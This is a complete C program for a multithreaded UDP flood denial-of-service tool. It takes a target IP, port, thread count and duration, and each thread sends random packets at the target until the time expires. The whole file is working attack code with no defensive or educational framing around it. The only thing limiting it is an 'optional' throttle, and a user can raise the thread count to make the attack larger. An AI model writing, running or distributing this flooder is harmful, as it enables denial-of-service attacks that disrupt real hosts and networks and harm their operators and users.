#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

#define PACKET_SIZE 1024

typedef struct {
    struct sockaddr_in server;
    time_t end_time;
    int thread_id;
} ThreadArgs;

void* udp_flood(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Allow address reuse to avoid "Address already in use" errors
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    char payload[PACKET_SIZE];
    srand(time(NULL) + args->thread_id); // Unique seed per thread

    while (time(NULL) < args->end_time) {
        // Generate a random payload
        for (int i = 0; i < PACKET_SIZE; i++) {
            payload[i] = rand() % 256;
        }

        ssize_t sent_bytes = sendto(sock, payload, PACKET_SIZE, 0,
                                    (struct sockaddr*)&args->server, sizeof(args->server));
        if (sent_bytes < 0) {
            fprintf(stderr, "Thread %d: sendto failed: %s\n", args->thread_id, strerror(errno));
            break;
        }

        usleep(1000); // Optional throttle to avoid overwhelming network
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Threads> <Time (seconds)>\n", argv[0]);
        return 1;
    }

    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
        perror("Invalid IP address");
        return 1;
    }

    int threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    time_t end_time = time(NULL) + duration;

    printf("Starting UDP flood on %s:%d for %d seconds using %d threads.\n",
           argv[1], atoi(argv[2]), duration, threads);

    pthread_t thread_pool[threads];
    ThreadArgs* args = malloc(threads * sizeof(ThreadArgs)); // Allocate separate memory for each thread

    for (int i = 0; i < threads; i++) {
        args[i].server = server;
        args[i].end_time = end_time;
        args[i].thread_id = i;
        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]) != 0) {
            perror("Failed to create thread");
            free(args);
            return 1;
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    free(args); // Free allocated memory
    printf("UDP flood completed.\n");
    return 0;
}
